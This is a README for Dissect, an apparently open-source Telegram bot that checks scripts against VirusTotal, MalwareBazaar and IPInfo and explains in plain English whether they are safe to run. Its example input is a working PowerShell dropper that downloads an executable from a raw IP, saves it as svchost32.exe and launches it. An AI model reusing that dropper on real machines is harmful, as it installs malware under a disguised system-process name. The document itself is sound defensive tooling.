![Dissect Logo](dissect_logo.png)

---

# Dissect

A Telegram bot that analyzes suspicious scripts and tells you in plain English whether they're safe to run. Paste a PowerShell command, drop a `.sh` file, get a verdict back in seconds — no security background required.

---

## Who It's For

Not security researchers. They have Ghidra. Dissect is for the IT person who got a `.ps1` attachment from an unknown sender, or the business owner whose employee forwarded "something weird." The output is written for someone who doesn't know what `ExecutionPolicy Bypass` means and shouldn't have to.

---

## What It Does

You submit a script. Dissect extracts every URL, IP address, and file hash, checks them against VirusTotal, MalwareBazaar, and IPInfo, runs the whole thing through an AI model trained to explain code to non-technical people, and returns a structured report: what the script does step by step, which behaviors are suspicious, whether the code is trying to hide itself, and a verdict — **RUN IT SAFELY**, **INVESTIGATE FURTHER**, or **DO NOT RUN THIS**.

Identical scripts are cached by hash, so the same script submitted a hundred times costs one analysis. The rest come back instantly.

---

## How It Works

```
Script submitted
       │
       ▼
Check analysis cache ──► Hit? ──► Return cached result (instant)
       │
       ▼
Extract URLs, IPs, hashes (regex)
       │
       ▼
Detect obfuscation patterns
       │
       ▼
Query external APIs in parallel:
  • VirusTotal — URL & hash reputation
  • MalwareBazaar — malware family lookup
  • IPInfo — IP geolocation & ASN
       │
       ▼
AI analysis (Groq) — combines script content + enrichment data
       │
       ▼
Risk scoring + verdict → cache result → respond
```

External API failures are non-fatal. If VirusTotal is rate-limited or MalwareBazaar is down, the analysis continues with whatever data is available.

---

## Setup

Two keys are required: a Groq API key and a Telegram bot token. Both are free. Enrichment API keys (VirusTotal, MalwareBazaar, IPInfo) are optional — the bot works without them, just with less context.

**Groq key** — [console.groq.com/keys](https://console.groq.com/keys), create a key, copy it.

**Telegram token** — open Telegram, find `@BotFather`, send `/newbot`, follow the prompts.

**Enrichment keys** (optional):
- VirusTotal — [virustotal.com/gui/my-apikey](https://www.virustotal.com/gui/my-apikey)
- MalwareBazaar — [bazaar.abuse.ch/api/#key](https://bazaar.abuse.ch/api/#key)
- IPInfo — [ipinfo.io/account](https://ipinfo.io/account)

Then:

```bash
cd dissect
pip install -r requirements.txt
cp .env.example .env
# open .env and paste your keys
python main.py
```

Open your bot in Telegram, send `/start`, paste a script or send a file (`.ps1`, `.bat`, `.sh`, `.py`, `.vbs`). Analysis takes 10–15 seconds.

---

## Example

**Input:**
```powershell
$url = 'http://185.220.101.47/payload.exe'
$path = $env:TEMP + '\svchost32.exe'
(New-Object System.Net.WebClient).DownloadFile($url, $path)
Start-Process $path
```

**Output:**
```
🔴 Dissect Analysis Complete
Risk Level: CRITICAL
Confidence: ✓✓✓

Summary:
This script downloads a file from the internet and runs it on your
computer. It saves the file with a name designed to look like a
legitimate Windows process.

What it does:
• Downloads a file from a raw IP address (not a website name)
• Saves it to your temp folder as svchost32.exe
• Runs it immediately

⚠️ Suspicious behaviors:
• [CRITICAL] Downloads and executes a file from an unknown IP address
• [HIGH] The filename is designed to look like a Windows system file

Verdict:
DO NOT RUN THIS. This script has the hallmarks of a malware dropper.
```

---

## Testing

```bash
python test.py
```

Runs four scripts through the full pipeline: a benign Windows Update checker (expects LOW), a malware dropper (expects CRITICAL), a base64-obfuscated payload (expects CRITICAL), and a legitimate Python installer (expects MEDIUM). Also tests the database layer, enrichment APIs, and the cache miss → cache hit flow.

---

## Project Structure

```
dissect/
├── main.py              # Entry point
├── config.py            # Loads keys from .env
├── ai/
│   ├── groq.py          # Groq API client
│   ├── prompts.py       # Versioned prompts
│   └── parser.py        # JSON parsing and validation
├── core/
│   ├── analyzer.py      # Pipeline orchestration
│   ├── extractor.py     # URL, IP, hash extraction
│   └── obfuscation.py   # Obfuscation pattern detection
├── enrichment/
│   ├── virustotal.py    # VirusTotal URL & hash reputation
│   ├── malwarebazaar.py # MalwareBazaar malware family lookup
│   └── ipinfo.py        # IPInfo geolocation & ASN
├── db/
│   ├── models.py        # SQLite schema & connection
│   └── queries.py       # Async queries for cache & submissions
├── bot/
│   ├── handlers.py      # Telegram handlers
│   └── formatter.py     # Output formatting
└── test.py              # Full test suite
```

---

## Rate Limits & Caching

| Service | Free Limit | Cache Strategy |
|---|---|---|
| Groq | 30 req/min, 14,400/day | Script hash, 7 days |
| VirusTotal | 500 req/day, 4/min | URL/hash, 24 hours |
| MalwareBazaar | Unlimited | Hash, 24 hours |
| IPInfo | 50k/month | IP, 7 days |

The same script submitted 100 times costs one AI call and one set of enrichment lookups. The rest are served from cache.

---

## Security Notes

Scripts are sent to Groq API for analysis. No raw scripts are stored — only SHA256 hashes and analysis results. Abuse detection flags users who submit the same hash repeatedly or at high velocity.

---

## Disclaimer

Dissect is an automated tool. It can be wrong, especially on heavily obfuscated or novel malware. If something matters, get a second opinion from a real security professional.

---

MIT License. Built as a cybersecurity analysis assistant for non-technical users.
